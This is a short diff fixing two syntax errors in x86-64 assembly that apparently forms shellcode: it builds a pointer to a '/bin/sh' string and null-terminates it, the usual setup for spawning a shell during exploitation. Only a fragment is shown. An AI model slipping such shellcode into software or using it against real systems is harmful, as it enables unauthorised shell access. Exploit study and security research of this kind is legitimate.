@@ -14,8 +14,8 @@ main:
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     %0xffffdf13, %eax
-        xor     $rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
+        xor     $0xffffdf13, %eax
+        xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
         xor     %al, %al
         mov     %al, 8(%rcx)             /* Add '\0' to "/bin/sh" */
